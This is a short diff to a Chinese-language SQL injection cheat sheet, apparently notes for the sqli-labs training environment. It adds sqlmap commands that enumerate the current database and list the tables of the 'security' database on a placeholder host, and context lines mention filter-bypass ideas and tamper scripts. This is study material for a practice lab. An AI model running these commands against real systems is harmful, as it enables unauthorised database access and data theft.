@@ -28,6 +28,14 @@ sqlmap -u "http://xxx/sqli/Less-11/?id=1" --data="uname=admin&passwd=admin&submi
 5、fuzz过滤函数，函数替换绕过
 6、sqlmap,tamper脚本绕过----上述思路
 
+查看所有数据库
+```
+sqlmap -u "http://xxx/sqli/Less-1/?id=1" --current-db
+```
+查看指定数据库（security）所含所有表
+```
+sqlmap -u "http://xxx/sqli/Less-1/?id=1" -D security --tables
+```
 
 
 ## **对于需要登录的网站，我们需要指定其cookie**
